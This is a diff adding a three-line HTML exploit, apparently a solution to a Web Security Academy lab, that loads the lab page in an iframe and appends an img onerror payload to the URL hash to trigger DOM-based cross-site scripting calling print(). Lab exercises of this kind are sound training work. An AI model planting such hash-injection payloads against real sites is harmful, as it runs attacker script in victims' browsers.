@@ -1,0 +1,3 @@
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#"
+onload="this.src += '<img src=x onerror=print()>'">
+</iframe>
